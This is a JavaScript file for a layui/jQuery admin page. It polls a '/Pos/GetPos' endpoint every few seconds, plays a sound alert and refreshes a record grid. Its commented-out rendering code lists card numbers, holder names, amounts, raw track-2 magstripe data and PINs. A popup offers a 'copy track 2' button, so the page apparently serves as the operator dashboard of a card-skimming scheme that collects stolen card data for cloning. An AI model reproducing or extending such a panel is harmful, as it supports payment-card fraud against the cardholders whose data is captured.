/**
 * 内容列表js
 * Autor: Fhua
 * Date: 16-11-29
 */

layui.use(['layer', 'common', 'icheck' , 'form'], function () {
    var $ = layui.jquery
    , layer = layui.layer
    , laypage = layui.laypage
    , common = layui.common
    , form = layui.form();
    $('<audio id="chatAudio"><source src="/Content/mp3/email.mp3" type="audio/mpeg"></audio>').appendTo('body');

    function longPolling() {
        $.ajax({
            url: '/Pos/GetPos',
            type: 'post',
            dataType: 'json',
            timeout: 10000,
            cache: false,
            success: function (json, startic) {
                if (json.state == 1) {
                    //var obj = eval(json.data);
                    //for (var i = 0; i < obj.length; i++) {
                    //    var html = '';
                    //    html += '<tr>';
                    //    html += '<td>';
                    //    html += '<input ids="' + obj[i].ID + '" name="' + obj[i].ID + '" type="checkbox" value="true" />';
                    //    html += '<td>' + obj[i].ID + '</a></td>';
                    //    //html += '<td>' + obj[0].订单号 + '</a></td>';
                    //    html += '<td>' + obj[i].卡号 + '</td>';
                    //    html += '<td>' + obj[i].姓名 + '</td>';
                    //    html += '<td>' + obj[i].金额 + '</td>';
                    //    html += '<td>' + obj[i].二磁道 + '</td>';
                    //    html += '<td>' + obj[i].密码 + '</td>';
                    //    html += '<td>' + obj[i].设备号 + '</td>';
                    //    html += '<td>' + obj[i].卡种 + '</td>';
                    //    html += '<td>' + obj[i].订单状态 + '</td>';
                    //    html += '<td>' + obj[i].授权账号 + '</td>';
                    //    html += '<td>' + obj[i].时间 + '</td>';
                    //    html += '</tr>';
                    //    $("#msg").prepend(html);
                    //    //加载单选框样式
                    //    $('input').iCheck({
                    //        checkboxClass: 'icheckbox_square-green',
                    //        radioClass: 'iradio_square-green'
                    //    });
                    //    //弹窗提醒                      
                    //    layer.open({
                    //        type: 1,
                    //        title: "您有新的消费记录：" + obj[i].ID,
                    //        closeBtn: 1, //不显示关闭按钮
                    //        shade: 0,
                    //        offset: 'rb',
                    //        area: ['400px', '267px'],
                    //        //offset: 'rb', //右下角弹出
                    //        anim: 2,
                    //        btn: ['返回结果', '复制二磁道'],
                    //        btnAlign: 'c',
                    //        content: '<div class="runtest layui-layer-wrap" style="display: block;">二磁道<br/>' + obj[i].二磁道 + '<br/>密&nbsp;&nbsp;码<br/>' + obj[i].密码 + '<textarea class="site-demo-text" id="testmain"></textarea></div>', //iframe的url，no代表不显示滚动条
                    //    });
                    //声音提醒
                    $('#chatAudio')[0].play();
                    setTimeout(function () {
                        //location.href = location.href;
                        $("#gridList").trigger("reloadGrid");
                    }, 3000);
                    //}
                }
                else if (json.state == 2) {
                    common.layerAlertE(json.message, '错误');
                }
            }
        })

    };
    setInterval(function () { longPolling(); }, 1000 * 5);//5秒执行一次请求
    setInterval(function () { $("#gridList").trigger("reloadGrid"); }, 1000 * 20);//20秒执行一次请求

    //监听查询
    form.on('submit(cx)', function (data) {
        var url = $(this).data('href');
        if (url) {
            $("#gridList").jqGrid('setGridParam', {
                url: url,
                postData: data.field, //发送数据
                page: 1
            }).trigger("reloadGrid"); //重新载入
        }
        else {
            common.layerError('提交链接错误！', '提示');
        }
        return false;
    });

});